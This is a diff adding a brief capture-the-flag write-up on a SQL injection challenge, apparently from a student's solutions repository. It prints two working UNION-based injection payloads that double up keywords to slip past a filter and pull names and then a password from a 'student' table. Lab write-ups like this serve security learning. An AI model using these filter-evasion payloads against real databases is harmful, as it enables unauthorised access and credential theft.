@@ -1,0 +1,5 @@
+1. In this problem we are needed to find the password of the Hidden Agent.
+2. By solving the problem Get your pa55word I came to know that a password field is present in the student table.
+3. So, I tried to find names of all the entitiies in the student table using the sql query: ' uunionnion selselectect null,name,null,null,null,null,null,null,null,null,null,null,null,null from student#
+4. I found an entry named "Hidden Agent".
+5. Then executing this command gave me the flag: ' uunionnion selselectect null,passwoorrd,null,null,null,null,null,null,null,null,null,null,null,null from student whwhereere name='Hidden Agent'#
